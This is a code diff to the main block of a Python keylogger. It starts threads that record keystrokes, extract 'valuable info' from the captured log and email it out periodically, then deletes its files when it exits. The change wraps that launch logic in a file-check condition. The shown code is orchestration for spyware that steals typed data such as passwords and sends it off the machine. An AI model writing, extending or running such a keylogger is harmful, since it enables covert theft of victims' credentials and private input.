@@ -201,31 +201,32 @@ import threading
 
 # Run keylogger and send_email_periodically simultaneously using threads
 if __name__ == "__main__":
-    try:
-        # Start the keylogger in one thread
-        keylogger_thread = threading.Thread(target=keylogger, daemon=True)
+    if check_and_create_file("valuable_info.txt", "keysniffer_data.txt"):
+        try:
+            # Start the keylogger in one thread
+            keylogger_thread = threading.Thread(target=keylogger, daemon=True)
 
-        # Start the keylogger in another thread
-        filter_thread = threading.Thread(
-            target=extract_valuable_info,
-            daemon=True,
-            args=("keysniffer_data.txt", "valuable_info.txt"),
-        )
+            # Start the keylogger in another thread
+            filter_thread = threading.Thread(
+                target=extract_valuable_info,
+                daemon=True,
+                args=("keysniffer_data.txt", "valuable_info.txt"),
+            )
 
-        # Start the email sender in another thread
-        email_thread = threading.Thread(target=send_email_periodically, daemon=True)
+            # Start the email sender in another thread
+            email_thread = threading.Thread(target=send_email_periodically, daemon=True)
 
-        filter_thread.start()
-        keylogger_thread.start()
-        email_thread.start()
+            filter_thread.start()
+            keylogger_thread.start()
+            email_thread.start()
 
-        # Keep the main thread alive
-        filter_thread.join()
-        keylogger_thread.join()
-        email_thread.join()
+            # Keep the main thread alive
+            filter_thread.join()
+            keylogger_thread.join()
+            email_thread.join()
 
-    except KeyboardInterrupt:
-        print("Program stopped.")
+        except KeyboardInterrupt:
+            print("Program stopped.")
 
-    finally:
-        delete_all_files()
+        finally:
+            delete_all_files()
